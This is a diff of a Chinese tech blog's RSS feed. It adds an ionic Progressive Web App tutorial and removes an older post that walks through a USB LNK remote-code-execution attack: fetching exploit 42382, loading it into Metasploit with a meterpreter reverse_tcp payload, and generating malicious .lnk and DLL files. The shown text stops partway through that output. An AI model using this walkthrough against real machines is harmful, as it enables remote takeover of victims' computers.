@@ -8,6 +8,117 @@
         <atom:link href="http://www.vinny.cc/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
+               <title>让 ionic 应用支持 Progressive Web App</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#删除注释&quot; id=&quot;markdown-toc-删除注释&quot;&gt;删除注释&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#进行部署&quot; id=&quot;markdown-toc-进行部署&quot;&gt;进行部署&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#优化操作&quot; id=&quot;markdown-toc-优化操作&quot;&gt;优化操作&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#注释-cordova-依赖&quot; id=&quot;markdown-toc-注释-cordova-依赖&quot;&gt;注释 cordova 依赖&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#删除不用的插件&quot; id=&quot;markdown-toc-删除不用的插件&quot;&gt;删除不用的插件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#完善manifestjson文件&quot; id=&quot;markdown-toc-完善manifestjson文件&quot;&gt;完善manifest.json文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#检查服务工作者文件&quot; id=&quot;markdown-toc-检查服务工作者文件&quot;&gt;检查服务工作者文件&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;ionic&lt;/strong&gt; 是当今流行的移动混合式开发解决方案，使用 webview 内核加载页面，具有开发成本低，入手快、丰富的插件库等特点。首先需要明确一点，ionic 默认已经支持了 &lt;strong&gt;PWA&lt;/strong&gt;，只需要简单几个步骤就可以开启。&lt;/p&gt;
+
+&lt;p&gt;这里默认你已经有了一个 ionic 的项目了&lt;/p&gt;
+
+&lt;h2 id=&quot;删除注释&quot;&gt;删除注释&lt;/h2&gt;
+
+&lt;p&gt;首先，进入 &lt;code class=&quot;highlighter-rouge&quot;&gt;src/index.html&lt;/code&gt; 文件中并找到以下注释掉的脚本，该脚本用于注册服务工作者，删除注释。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Html&quot;&gt;&amp;lt;script&amp;gt;
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('service-worker.js')
+      .then(() =&amp;gt; console.log('service worker installed'))
+      .catch(err =&amp;gt; console.log('Error', err));
+  }
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;一个 ionic 的 PWA 应用已经完成&lt;/strong&gt;。是的，你没有看错，现在就可以部署它。默认的 ionic 工程已经含有 &lt;em&gt;service-worker.js&lt;/em&gt; 文件及 &lt;em&gt;manifest.json&lt;/em&gt; 文件，文件中的内容具备”基本”的 PWA 应用的条件，所以只需要删除注释，它就是一个完整的 PWA 应用。&lt;/p&gt;
+
+&lt;h2 id=&quot;进行部署&quot;&gt;进行部署&lt;/h2&gt;
+
+&lt;p&gt;开始部署，我们需要对代码进行压缩、混淆。幸好，ionic 已经帮我们做了，一切只需要一条命令。&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;npm run ionic:build &lt;span class=&quot;nt&quot;&gt;--prod&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这条命令将对代码以生产模式进行归档，获得发布的最小文件。命令执行完成后，只需要将 &lt;strong&gt;www&lt;/strong&gt; 目录上传到指定的 &lt;strong&gt;HTTPS&lt;/strong&gt; 服务器中即可。&lt;/p&gt;
+
+&lt;h2 id=&quot;优化操作&quot;&gt;优化操作&lt;/h2&gt;
+
+&lt;p&gt;为了使用 ionic 应用对 PWA 应用 进行更好的表现，我们还是需要对其缺省的配置进行优化的。&lt;/p&gt;
+
+&lt;h3 id=&quot;注释-cordova-依赖&quot;&gt;注释 cordova 依赖&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;cordova.js&lt;/em&gt; 只有运行在 app 环境中才会有用，在 web 环境下只有不停的警告输出，而且还浪费加载时间，所以应该在 &lt;code class=&quot;highlighter-rouge&quot;&gt;src/index.html&lt;/code&gt; 中注释掉。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- cordova.js required for cordova apps --&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--&amp;lt;script src=&quot;cordova.js&quot;&amp;gt;&amp;lt;/script&amp;gt;--&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;删除不用的插件&quot;&gt;删除不用的插件&lt;/h3&gt;
+
+&lt;p&gt;如果只是部署 PWA 应用，可以去 &lt;em&gt;app.component.ts&lt;/em&gt; 中删除插件的调用，在 &lt;em&gt;app.module.ts&lt;/em&gt; 中删除导入的 &lt;code class=&quot;highlighter-rouge&quot;&gt;StatusBar&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;SplashScreen&lt;/code&gt; 插件。&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'@angular/core'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TabsPage&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../pages/tabs/tabs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;Component&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;templateUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'app.html'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;MyApp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;rootPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TabsPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;完善manifestjson文件&quot;&gt;完善manifest.json文件&lt;/h3&gt;
+
+&lt;p&gt;缺省的 &lt;em&gt;manifest.json&lt;/em&gt; 文件使用的是 ionic 的描述信息，应该讲其修改为自己应用的描述信息，也需要提供多种不同尺寸图标进行配置，更完整的 &lt;em&gt;manifest.json&lt;/em&gt; 配置请参看另一篇文章的 &lt;a href=&quot;https://vinny.cc/2018/05/pwa-app/#41-%E5%BA%94%E7%94%A8%E6%8F%8F%E8%BF%B0%E6%96%87%E4%BB%B6&quot;&gt;应用描述文件&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;检查服务工作者文件&quot;&gt;检查服务工作者文件&lt;/h3&gt;
+
+&lt;p&gt;下面是 ionic 缺省的服务工作者 &lt;code class=&quot;highlighter-rouge&quot;&gt;src/service-worker.js&lt;/code&gt; 配置。此配置将预先缓存所有静态资源，确保应用程序在任何网络条件下都可以正常运行，可以根据需要配置 &lt;strong&gt;运行时缓存&lt;/strong&gt; 以得到更好的体验。&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;'use strict'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;importScripts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./build/sw-toolbox.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ionic-cache'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// pre-cache our key assets&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;precache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'./build/main.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'./build/main.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'./build/polyfills.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;s1&quot;&gt;'manifest.json'&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// dynamically cache any other local assets&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;any&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cacheFirst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// for any other requests go to the network, cache,&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// and then only use that cached resource if your user goes offline&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toolbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;networkFirst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>  
+               <pubDate>Sat, 12 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/pwa-ionic/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-ionic/</guid>  
+               </item>  
+          
+            <item>  
                <title>使用 sw-precache 构建 Progressive Web App</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#1-sw-precache-介绍&quot; id=&quot;markdown-toc-1-sw-precache-介绍&quot;&gt;1. Sw-Precache 介绍&lt;/a&gt;&lt;/li&gt;
@@ -165,7 +276,7 @@
   &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/updates/2015/02/offline-first-with-sw-precache&quot;&gt;https://developers.google.com/web/updates/2015/02/offline-first-with-sw-precache&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>  
-               <pubDate>Sat, 12 May 2018 00:00:00 +0800</pubDate>  
+               <pubDate>Fri, 11 May 2018 00:00:00 +0800</pubDate>  
                <link>http://www.vinny.cc/2018/05/pwa-sw-precache/</link>  
                <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-sw-precache/</guid>  
                </item>  
@@ -360,6 +471,10 @@
   &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;也可以定义成远程的 service-worker.js，如 &lt;code class=&quot;highlighter-rouge&quot;&gt;var sw = &quot;https://xxx.xxx.xxx/caching/sw-cacher.js&quot;;&lt;/code&gt;，然后进行注册 &lt;code class=&quot;highlighter-rouge&quot;&gt;navigator.serviceWorker.register(sw)&lt;/code&gt;，这样就不需要每次对 &lt;em&gt;service-worker.js&lt;/em&gt; 文件进行上传。&lt;/p&gt;
+&lt;/blockquote&gt;
 
 &lt;h3 id=&quot;45-发布到服务器中&quot;&gt;4.5 发布到服务器中&lt;/h3&gt;
 
@@ -666,7 +781,7 @@
   &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&quot;&gt;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>  
-               <pubDate>Fri, 11 May 2018 00:00:00 +0800</pubDate>  
+               <pubDate>Thu, 10 May 2018 00:00:00 +0800</pubDate>  
                <link>http://www.vinny.cc/2018/05/pwa-app/</link>  
                <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-app/</guid>  
                </item>  
@@ -1988,82 +2103,6 @@ git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
                <pubDate>Wed, 14 Mar 2018 00:00:00 +0800</pubDate>  
                <link>http://www.vinny.cc/2018/03/jersey-jwt/</link>  
                <guid isPermaLink="true">http://www.vinny.cc/2018/03/jersey-jwt/</guid>  
-               </item>  
-          
-            <item>  
-               <title>通过U盘使用Link漏洞进行攻击</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#1-下载漏洞脚本&quot; id=&quot;markdown-toc-1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#2-安装漏洞脚本&quot; id=&quot;markdown-toc-2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#3-启动监听并生成文件&quot; id=&quot;markdown-toc-3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#4-制作渗透u盘&quot; id=&quot;markdown-toc-4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#5-触发漏洞得到shell&quot; id=&quot;markdown-toc-5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/h2&gt;
-
-&lt;p&gt;从 &lt;strong&gt;&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;exploit-db&lt;/a&gt;&lt;/strong&gt; 下载 &lt;strong&gt;LNK Remote Code Execution Vulnerability&lt;/strong&gt; 漏洞文件&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://www.exploit-db.com/download/42382.rb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/h2&gt;
-
-&lt;p&gt;安装漏洞脚本很简单，只需要将下载的ruby漏洞脚本文件放到metasploit指定目录中即可&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;42382.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search 42382
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/fileformat/42382
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp &lt;span class=&quot;c&quot;&gt;# 注意目标是x86还是x64的&lt;/span&gt;
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.1.15
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show targets
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;target 0
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/lLbLLlpJEWOCVjXn.dll created copy it to the root folder of the target USB drive
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/attUBiQoEENCHdXj_D.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is D
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/TPIhmhvfUkHRaotP_E.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is E
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/jlhbqmicbvEDUucR_F.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is F
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/KvvqRTlZixISpRHK_G.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is G
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/FDiknQGLVXPKFBIC_H.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is H
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/gHhqXTwmxeDPlpTA_I.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is I
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/njveXscZFvRwJLFJ_J.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is J
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/nZxhpuwJHVAIUNXx_K.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is K
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/QbOVySllSZXOmglY_L.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is L
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/qQhIaawNDiMbcaqK_M.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is M
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/fSylFhAGVNNwaYnd_N.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is N
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/PQyizrKnVNCRQJkd_O.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is O
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/xfhnyJCEsOdbpnhs_P.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is P
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/oSYDiEMnouNpHFqE_Q.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Q
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/OBlpipdrGcLVdvhd_R.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is R
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/MFxDTvxGjYarzweM_S.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is S
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/LwmuNxBWnRfWevDC_T.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is T
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/wlJlNxRBICJVLnQX_U.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is U
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/rOHsCIBWNTrXGstq_V.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is V
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/BKUZRSPKBSukmlpy_W.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is W
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/hbOvINMLAxHcWavV_X.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is X
